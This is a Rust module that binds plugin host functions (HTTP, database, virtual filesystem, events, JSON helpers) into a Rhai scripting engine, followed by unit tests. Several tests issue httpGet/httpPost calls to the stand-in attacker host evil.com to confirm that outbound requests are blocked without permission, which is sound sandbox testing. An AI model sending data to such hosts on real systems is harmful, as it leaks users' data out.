//! Rhai host functions — engine binding layer
//!
//! Only responsible for binding the shared business logic of
//! [`HostContext`](super::host_common::HostContext) to the Rhai global scope
//! via `engine.register_fn()`.
//!
//! Rhai does not need an external SDK file; the Host API is injected directly via `register_fn`,
//! along with helper functions like `parse_json` / `to_json` / `to_upper` / `to_lower` / `replace`.

use std::sync::Arc;

use rhai::Engine;

use crate::config::app::AppConfig;
use crate::db::Pool;
use crate::plugins::Permissions;
use crate::plugins::host_common::HostContext;

/// Register host functions into the Rhai Engine global scope.
pub fn register_host_functions(
    engine: &mut Engine,
    config: Arc<AppConfig>,
    plugin_id: String,
    permissions: Permissions,
    pool: Option<Pool>,
    event_bus: Option<crate::eventbus::EventBus>,
) {
    let mut hc_inner = HostContext::new("rhai", config, plugin_id, permissions, pool);
    if let Some(bus) = event_bus {
        hc_inner.set_event_bus(bus);
    }
    let host_ctx = Arc::new(hc_inner);

    let hc = host_ctx.clone();
    engine.register_fn("log", move |level: &str, msg: &str| {
        hc.log(level, msg);
    });

    let hc = host_ctx.clone();
    engine.register_fn("getConfig", move |key: &str| -> rhai::Dynamic {
        match hc.get_config(key) {
            Some(v) => v.into(),
            None => rhai::Dynamic::UNIT,
        }
    });

    let hc = host_ctx.clone();
    engine.register_fn("httpGet", move |url: &str| -> String { hc.http_get(url) });

    let hc = host_ctx.clone();
    engine.register_fn("httpPost", move |url: &str, body: &str| -> String {
        hc.http_post(url, body)
    });

    let hc = host_ctx.clone();
    engine.register_fn("getData", move |key: &str| -> rhai::Dynamic {
        match hc.get_data(key) {
            Some(v) => v.into(),
            None => rhai::Dynamic::UNIT,
        }
    });

    let hc = host_ctx.clone();
    engine.register_fn("setData", move |key: &str, value: &str| -> bool {
        hc.set_data(key, value)
    });

    let hc = host_ctx.clone();
    engine.register_fn("getPost", move |slug: &str| -> rhai::Dynamic {
        match hc.get_post(slug) {
            Some(v) => v.into(),
            None => rhai::Dynamic::UNIT,
        }
    });

    let hc = host_ctx.clone();
    engine.register_fn("dbQuery", move |sql: &str, params: &str| -> String {
        hc.db_query(sql, params)
    });

    let hc = host_ctx.clone();
    engine.register_fn("dbExecute", move |sql: &str, params: &str| -> String {
        hc.db_execute(sql, params)
    });

    let hc = host_ctx.clone();
    engine.register_fn("dbBegin", move || -> String { hc.db_begin() });

    let hc = host_ctx.clone();
    engine.register_fn("dbCommit", move || -> String { hc.db_commit() });

    let hc = host_ctx.clone();
    engine.register_fn("dbRollback", move || -> String { hc.db_rollback() });

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbInsert",
        move |table: &str, data: &str, options: &str| -> String {
            hc.db_insert(table, data, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbFetchOne",
        move |table: &str, r#where: &str, options: &str| -> String {
            hc.db_fetch_one(table, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbFetchAll",
        move |table: &str, r#where: &str, options: &str| -> String {
            hc.db_fetch_all(table, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbUpdate",
        move |table: &str, data: &str, r#where: &str, options: &str| -> String {
            hc.db_update(table, data, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbDelete",
        move |table: &str, r#where: &str, options: &str| -> String {
            hc.db_delete(table, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbCount",
        move |table: &str, r#where: &str, options: &str| -> String {
            hc.db_count(table, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbIncrement",
        move |table: &str, columns: &str, r#where: &str, options: &str| -> String {
            hc.db_increment(table, columns, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn(
        "dbSum",
        move |table: &str, column: &str, r#where: &str, options: &str| -> String {
            hc.db_sum(table, column, r#where, options)
        },
    );

    let hc = host_ctx.clone();
    engine.register_fn("dbGroupBy", move |table: &str, options: &str| -> String {
        hc.db_group_by(table, options)
    });

    let hc = host_ctx.clone();
    engine.register_fn("vfsRead", move |path: &str| -> rhai::Dynamic {
        match hc.vfs_read(path) {
            Ok(v) => v.into(),
            Err(_) => rhai::Dynamic::UNIT,
        }
    });

    let hc = host_ctx.clone();
    engine.register_fn("vfsWrite", move |path: &str, content: &str| -> bool {
        hc.vfs_write(path, content).is_ok()
    });

    let hc = host_ctx.clone();
    engine.register_fn("vfsDelete", move |path: &str| -> bool {
        hc.vfs_delete(path).is_ok()
    });

    let hc = host_ctx.clone();
    engine.register_fn("vfsExists", move |path: &str| -> rhai::Dynamic {
        match hc.vfs_exists(path) {
            Ok(true) => true.into(),
            Ok(false) => false.into(),
            Err(_) => rhai::Dynamic::UNIT,
        }
    });

    let hc = host_ctx.clone();
    engine.register_fn("vfsList", move |path: &str| -> String {
        hc.vfs_list(path)
            .ok()
            .map(|entries| entries.join(","))
            .unwrap_or_default()
    });

    let hc = host_ctx.clone();
    engine.register_fn("vfsStat", move |path: &str| -> rhai::Dynamic {
        match hc.vfs_stat(path) {
            Ok(v) => v.into(),
            Err(_) => rhai::Dynamic::UNIT,
        }
    });

    let hc = host_ctx.clone();
    engine.register_fn("newId", move || -> String { hc.new_uuid() });

    let hc = host_ctx.clone();
    engine.register_fn("dbPh", move |idx: i64| -> String { hc.db_ph(idx as usize) });

    let hc = host_ctx.clone();
    engine.register_fn("emitEvent", move |event_type: &str, data: &str| -> String {
        hc.emit_event(event_type, data)
    });

    engine.register_fn("parse_json", |json_str: &str| -> rhai::Dynamic {
        match serde_json::from_str::<serde_json::Value>(json_str) {
            Ok(val) => rhai::serde::to_dynamic(&val).unwrap_or(rhai::Dynamic::UNIT),
            Err(_) => rhai::Dynamic::UNIT,
        }
    });

    engine.register_fn("to_json", |val: rhai::Dynamic| -> String {
        match rhai::serde::from_dynamic::<serde_json::Value>(&val) {
            Ok(v) => serde_json::to_string(&v).unwrap_or_default(),
            Err(_) => val.to_string(),
        }
    });

    engine.register_fn("to_upper", |s: &str| -> String { s.to_uppercase() });

    engine.register_fn("to_lower", |s: &str| -> String { s.to_lowercase() });

    engine.register_fn("replace", |s: &str, from: &str, to: &str| -> String {
        s.replace(from, to)
    });

    engine.register_fn("remove", |map: &mut rhai::Map, key: &str| {
        map.remove(key);
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_test_config() -> Arc<AppConfig> {
        Arc::new(AppConfig::test_defaults())
    }

    #[test]
    fn register_host_functions_in_context() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let result: () = engine.eval(r#"log("info", "test")"#).unwrap();

        assert_eq!(result, ());
    }

    #[test]
    fn host_get_config_returns_known_values() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions {
            config: vec!["app.*".into()],
            ..Permissions::default()
        };
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let env = engine
            .eval::<rhai::Dynamic>(r#"getConfig("app.env")"#)
            .unwrap();
        let env_str = env.to_string();
        assert!(
            env_str.contains("test"),
            "env should be 'test', got: {env_str}"
        );

        let port = engine
            .eval::<rhai::Dynamic>(r#"getConfig("app.port")"#)
            .unwrap();
        let port_str = port.to_string();
        assert!(
            port_str.contains("9898"),
            "port should be '9898', got: {port_str}"
        );

        let result = engine
            .eval::<rhai::Dynamic>(r#"getConfig("nonexistent.key")"#)
            .unwrap();
        let result_str = result.to_string();
        assert!(
            result_str == "()" || result_str == "null" || result.is::<()>(),
            "unknown key should return empty, got: {result_str}"
        );
    }

    #[test]
    fn host_get_data_returns_none_without_pool() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let result = engine
            .eval::<rhai::Dynamic>(r#"getData("some.key")"#)
            .unwrap();
        assert!(result.is::<()>(), "should return unit for None");
    }

    #[test]
    fn host_http_post_blocked_without_permission() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let result: String = engine
            .eval(r#"httpPost("https://evil.com", "{}")"#)
            .unwrap();
        assert!(result.contains("not allowed"));
    }

    #[test]
    fn host_get_post_returns_none_without_pool() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let result = engine
            .eval::<rhai::Dynamic>(r#"getPost("some-slug")"#)
            .unwrap();
        assert!(result.is::<()>(), "should return unit for None");
    }

    #[test]
    fn host_all_functions_registered() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let _: () = engine.eval(r#"log("info", "test")"#).unwrap();
        let _ = engine.eval::<rhai::Dynamic>(r#"getConfig("k")"#).unwrap();
        let _: String = engine.eval(r#"httpGet("https://evil.com")"#).unwrap();
        let _: String = engine
            .eval(r#"httpPost("https://evil.com", "{}")"#)
            .unwrap();
        let _ = engine.eval::<rhai::Dynamic>(r#"getData("k")"#).unwrap();
        let _: bool = engine.eval(r#"setData("k", "v")"#).unwrap();
        let _ = engine.eval::<rhai::Dynamic>(r#"getPost("s")"#).unwrap();
        let _: String = engine.eval(r#"dbQuery("SELECT 1", "[]")"#).unwrap();
        let _: String = engine
            .eval(r#"dbExecute("INSERT INTO t VALUES(1)", "[]")"#)
            .unwrap();
        let _: String = engine.eval(r#"dbBegin()"#).unwrap();
        let _: String = engine.eval(r#"dbCommit()"#).unwrap();
        let _: String = engine.eval(r#"dbRollback()"#).unwrap();
        let _: String = engine.eval(r#"dbPh(1)"#).unwrap();
        let _: String = engine.eval(r#"dbInsert("t", "{}", "{}")"#).unwrap();
        let _: String = engine.eval(r#"dbFetchOne("t", "{}", "{}")"#).unwrap();
        let _: String = engine.eval(r#"dbFetchAll("t", "{}", "{}")"#).unwrap();
        let _: String = engine.eval(r#"dbUpdate("t", "{}", "{}", "{}")"#).unwrap();
        let _: String = engine.eval(r#"dbDelete("t", "{}", "{}")"#).unwrap();
        let _: String = engine.eval(r#"dbCount("t", "{}", "{}")"#).unwrap();
        let _ = engine.eval::<rhai::Dynamic>(r#"vfsRead("f")"#).unwrap();
        let _: bool = engine.eval(r#"vfsWrite("f", "c")"#).unwrap();
        let _: bool = engine.eval(r#"vfsDelete("f")"#).unwrap();
        let _ = engine.eval::<rhai::Dynamic>(r#"vfsExists("f")"#).unwrap();
        let _: String = engine.eval(r#"vfsList("d")"#).unwrap();
        let _ = engine.eval::<rhai::Dynamic>(r#"vfsStat("f")"#).unwrap();
        let _: String = engine.eval(r#"newId()"#).unwrap();
        let _: String = engine.eval(r#"emitEvent("t", "{}")"#).unwrap();
    }

    #[test]
    fn host_db_query_rejects_non_select() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let result: String = engine
            .eval(r#"dbQuery("DELETE FROM posts", "[]")"#)
            .unwrap();
        assert!(result.contains("only SELECT"));
    }

    #[test]
    fn host_parse_json_and_to_json() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let result: String = engine
            .eval(r#"to_json(parse_json(`{"title":"hello"}`))"#)
            .unwrap();
        assert!(result.contains("hello"));
    }

    #[test]
    fn host_string_helpers() {
        let mut engine = Engine::new();
        let config = make_test_config();
        let perms = Permissions::default();
        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);

        let upper: String = engine.eval(r#"to_upper("hello")"#).unwrap();
        assert_eq!(upper, "HELLO");

        let lower: String = engine.eval(r#"to_lower("HELLO")"#).unwrap();
        assert_eq!(lower, "hello");

        let replaced: String = engine
            .eval(r#"replace("hello world", "world", "rhai")"#)
            .unwrap();
        assert_eq!(replaced, "hello rhai");
    }
}
